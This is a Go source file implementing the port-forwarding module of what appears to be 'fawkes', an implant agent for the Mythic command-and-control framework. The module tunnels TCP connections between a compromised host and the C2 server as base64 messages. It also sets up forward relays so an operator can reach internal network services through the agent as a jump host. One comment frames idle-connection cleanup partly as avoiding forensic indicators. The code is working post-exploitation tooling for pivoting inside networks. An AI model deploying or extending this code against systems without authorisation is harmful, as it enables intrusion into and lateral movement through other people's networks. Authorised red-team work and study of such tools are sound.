package rpfwd

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

const (
	readBufSize     = 32 * 1024       // 32KB per read
	idleReadTimeout = 5 * time.Minute // close idle connections to prevent goroutine/connection leaks
)

// connTracker tracks a single rpfwd connection
type connTracker struct {
	conn    net.Conn
	port    uint32
	writeCh chan structs.SocksMsg
}

// forwardRelay tracks a forward port forward: agent listens on a local port
// and relays connections directly to an internal target without C2 involvement.
type forwardRelay struct {
	listener   net.Listener
	targetAddr string // "ip:port"
	bindAddr   string // "0.0.0.0" or "127.0.0.1"
	port       uint32
}

// Manager handles all active reverse port forward listeners and connections
type Manager struct {
	listeners       map[uint32]net.Listener  // port → listener (reverse mode)
	connections     map[uint32]*connTracker  // serverId → connection
	forwardRelays   map[uint32]*forwardRelay // port → forward relay config
	outbound        []structs.SocksMsg
	mu              sync.Mutex
	IdleReadTimeout time.Duration // exported for testing; defaults to idleReadTimeout const
}

// NewManager creates a new rpfwd manager
func NewManager() *Manager {
	return &Manager{
		listeners:       make(map[uint32]net.Listener),
		connections:     make(map[uint32]*connTracker),
		forwardRelays:   make(map[uint32]*forwardRelay),
		IdleReadTimeout: idleReadTimeout,
	}
}

// Start begins listening on the specified port for rpfwd connections
func (m *Manager) Start(port uint32) error {
	m.mu.Lock()
	// Close existing listener on this port if any
	if existing, ok := m.listeners[port]; ok {
		existing.Close()
		m.closeConnectionsForPort(port)
	}
	m.mu.Unlock()

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	listener, err := net.Listen("tcp4", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", addr, err)
	}

	m.mu.Lock()
	m.listeners[port] = listener
	m.mu.Unlock()

	go m.acceptConnections(listener, port)

	log.Printf("listen :%d", port)
	return nil
}

// Stop closes the listener (reverse or forward) and all connections on the specified port.
func (m *Manager) Stop(port uint32) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Check reverse listeners
	if listener, ok := m.listeners[port]; ok {
		listener.Close()
		delete(m.listeners, port)
		m.closeConnectionsForPort(port)
		log.Printf("stop listen :%d", port)
		return nil
	}

	// Check forward relays
	if relay, ok := m.forwardRelays[port]; ok {
		relay.listener.Close()
		delete(m.forwardRelays, port)
		m.closeConnectionsForPort(port)
		log.Printf("stop forward :%d", port)
		return nil
	}

	return fmt.Errorf("no port forward on port %d", port)
}

// StartForward begins a forward port forward: the agent listens on bindAddr:port
// and relays each accepted connection directly to targetAddr (ip:port) without
// routing data through C2. This lets the operator access internal services via
// the agent as a jump host (typically reached through a SOCKS proxy).
func (m *Manager) StartForward(port uint32, targetAddr string, bindAddr string) error {
	if bindAddr == "" {
		bindAddr = "0.0.0.0"
	}

	m.mu.Lock()
	// Close existing forward relay or reverse listener on this port
	if existing, ok := m.forwardRelays[port]; ok {
		existing.listener.Close()
		m.closeConnectionsForPort(port)
		delete(m.forwardRelays, port)
	}
	if existing, ok := m.listeners[port]; ok {
		existing.Close()
		m.closeConnectionsForPort(port)
		delete(m.listeners, port)
	}
	m.mu.Unlock()

	addr := fmt.Sprintf("%s:%d", bindAddr, port)
	listener, err := net.Listen("tcp4", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", addr, err)
	}

	relay := &forwardRelay{
		listener:   listener,
		targetAddr: targetAddr,
		bindAddr:   bindAddr,
		port:       port,
	}

	m.mu.Lock()
	m.forwardRelays[port] = relay
	m.mu.Unlock()

	go m.acceptForwardConnections(relay)

	log.Printf("forward :%d → %s", port, targetAddr)
	return nil
}

// StopForward closes a forward port forward listener and all its connections.
func (m *Manager) StopForward(port uint32) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	relay, ok := m.forwardRelays[port]
	if !ok {
		return fmt.Errorf("no forward port forward on port %d", port)
	}

	relay.listener.Close()
	delete(m.forwardRelays, port)
	m.closeConnectionsForPort(port)

	log.Printf("stop forward :%d", port)
	return nil
}

// Close stops all listeners and closes all connections. Should be called during agent shutdown.
func (m *Manager) Close() {
	m.mu.Lock()
	defer m.mu.Unlock()
	for port, listener := range m.listeners {
		listener.Close()
		delete(m.listeners, port)
	}
	for port, relay := range m.forwardRelays {
		relay.listener.Close()
		delete(m.forwardRelays, port)
	}
	for id, tracker := range m.connections {
		tracker.conn.Close()
		close(tracker.writeCh)
		delete(m.connections, id)
	}
	m.outbound = nil
}

// DrainOutbound atomically returns all pending outbound rpfwd messages and clears the queue
func (m *Manager) DrainOutbound() []structs.SocksMsg {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(m.outbound) == 0 {
		return nil
	}
	msgs := m.outbound
	m.outbound = nil
	return msgs
}

// HandleMessages processes inbound rpfwd messages from Mythic
func (m *Manager) HandleMessages(msgs []structs.SocksMsg) {
	for _, msg := range msgs {
		m.mu.Lock()
		tracker, exists := m.connections[msg.ServerId]
		m.mu.Unlock()

		if !exists {
			if !msg.Exit {
				// Unknown connection, send exit back
				m.queueExit(msg.ServerId, msg.Port)
			}
			continue
		}

		if msg.Exit {
			m.closeConnection(msg.ServerId)
			continue
		}

		// Route data to the connection's write channel
		select {
		case tracker.writeCh <- msg:
		default:
			// Channel full, drop data (shouldn't happen with reasonable buffer)
			log.Printf("channel full sid=%d, dropping", msg.ServerId)
		}
	}
}

// acceptConnections handles incoming TCP connections on a listener
func (m *Manager) acceptConnections(listener net.Listener, port uint32) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			// Listener closed
			return
		}

		serverID := rand.Uint32()
		writeCh := make(chan structs.SocksMsg, 200)

		tracker := &connTracker{
			conn:    conn,
			port:    port,
			writeCh: writeCh,
		}

		m.mu.Lock()
		m.connections[serverID] = tracker
		m.mu.Unlock()

		log.Printf("conn :%d sid=%d from %s", port, serverID, conn.RemoteAddr())

		go m.readFromConnection(serverID, conn, port)
		go m.writeToConnection(serverID, conn, writeCh, port)
	}
}

// acceptForwardConnections handles incoming TCP connections on a forward relay listener.
// For each accepted connection, it dials the target and relays data bidirectionally
// without sending any rpfwd messages through C2.
func (m *Manager) acceptForwardConnections(relay *forwardRelay) {
	for {
		clientConn, err := relay.listener.Accept()
		if err != nil {
			return // listener closed
		}

		serverID := rand.Uint32()
		log.Printf("forward conn :%d sid=%d from %s → %s", relay.port, serverID, clientConn.RemoteAddr(), relay.targetAddr)

		// Connect to the internal target
		targetConn, err := net.DialTimeout("tcp", relay.targetAddr, 10*time.Second)
		if err != nil {
			log.Printf("forward target dial failed sid=%d: %v", serverID, err)
			clientConn.Close()
			continue
		}

		// Track both connections under the same serverID for cleanup
		tracker := &connTracker{
			conn:    clientConn,
			port:    relay.port,
			writeCh: make(chan structs.SocksMsg, 1), // unused for forward, but keeps closeConnection safe
		}
		m.mu.Lock()
		m.connections[serverID] = tracker
		m.mu.Unlock()

		go m.relayForward(serverID, clientConn, targetConn, relay.port)
	}
}

// relayForward copies data bidirectionally between client and target connections.
// When either side closes, both connections are cleaned up.
func (m *Manager) relayForward(serverID uint32, client, target net.Conn, port uint32) {
	done := make(chan struct{}, 2)

	copyWithTimeout := func(dst, src net.Conn) {
		defer func() { done <- struct{}{} }()
		buf := make([]byte, readBufSize)
		for {
			src.SetReadDeadline(time.Now().Add(m.IdleReadTimeout))
			n, err := src.Read(buf)
			if n > 0 {
				if _, werr := dst.Write(buf[:n]); werr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}

	go copyWithTimeout(target, client) // client → target
	go copyWithTimeout(client, target) // target → client

	// Wait for either direction to finish
	<-done

	// Clean up
	client.Close()
	target.Close()

	m.mu.Lock()
	if _, exists := m.connections[serverID]; exists {
		delete(m.connections, serverID)
	}
	m.mu.Unlock()
}

// readFromConnection reads data from a TCP connection and queues it as outbound rpfwd messages.
// Uses an idle read timeout to prevent goroutine/connection leaks when remote endpoints
// stop responding without closing the connection (common with firewalls, NAT timeouts,
// or crashed services). Long-running idle connections are also forensic indicators.
func (m *Manager) readFromConnection(serverID uint32, conn net.Conn, port uint32) {
	buf := make([]byte, readBufSize)
	for {
		conn.SetReadDeadline(time.Now().Add(m.IdleReadTimeout))
		n, err := conn.Read(buf)
		if n > 0 {
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			m.mu.Lock()
			m.outbound = append(m.outbound, structs.SocksMsg{
				ServerId: serverID,
				Data:     encoded,
				Exit:     false,
				Port:     port,
			})
			m.mu.Unlock()
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Idle timeout — check if connection was already closed externally
				m.mu.Lock()
				_, stillActive := m.connections[serverID]
				m.mu.Unlock()
				if !stillActive {
					conn.Close()
					return
				}
				// Connection still active but idle for too long — close it
				log.Printf("idle timeout sid=%d", serverID)
			} else if err != io.EOF {
				log.Printf("read error sid=%d: %v", serverID, err)
			}
			// Connection closed, timed out, or errored — send exit and clean up
			m.mu.Lock()
			m.outbound = append(m.outbound, structs.SocksMsg{
				ServerId: serverID,
				Data:     "",
				Exit:     true,
				Port:     port,
			})
			tracker, trackerExists := m.connections[serverID]
			delete(m.connections, serverID)
			m.mu.Unlock()
			if trackerExists {
				close(tracker.writeCh)
			}
			conn.Close()
			return
		}
	}
}

// writeToConnection writes Mythic data to the TCP connection
func (m *Manager) writeToConnection(serverID uint32, conn net.Conn, writeCh chan structs.SocksMsg, port uint32) {
	for msg := range writeCh {
		if msg.Exit {
			m.closeConnection(serverID)
			return
		}

		if msg.Data == "" {
			continue
		}

		data, err := base64.StdEncoding.DecodeString(msg.Data)
		if err != nil {
			log.Printf("decode error sid=%d", serverID)
			m.queueExit(serverID, port)
			m.closeConnection(serverID)
			return
		}

		if _, err := conn.Write(data); err != nil {
			log.Printf("write error sid=%d: %v", serverID, err)
			m.queueExit(serverID, port)
			m.closeConnection(serverID)
			return
		}
	}
}

// closeConnection closes a single connection and removes it from tracking
func (m *Manager) closeConnection(serverID uint32) {
	m.mu.Lock()
	tracker, exists := m.connections[serverID]
	if exists {
		delete(m.connections, serverID)
	}
	m.mu.Unlock()

	if exists {
		tracker.conn.Close()
		close(tracker.writeCh)
	}
}

// closeConnectionsForPort closes all connections associated with a specific port.
// Must be called with m.mu held.
func (m *Manager) closeConnectionsForPort(port uint32) {
	for id, tracker := range m.connections {
		if tracker.port == port {
			tracker.conn.Close()
			close(tracker.writeCh)
			delete(m.connections, id)
		}
	}
}

// queueExit queues an exit message for a server_id
func (m *Manager) queueExit(serverID uint32, port uint32) {
	m.mu.Lock()
	m.outbound = append(m.outbound, structs.SocksMsg{
		ServerId: serverID,
		Data:     "",
		Exit:     true,
		Port:     port,
	})
	m.mu.Unlock()
}
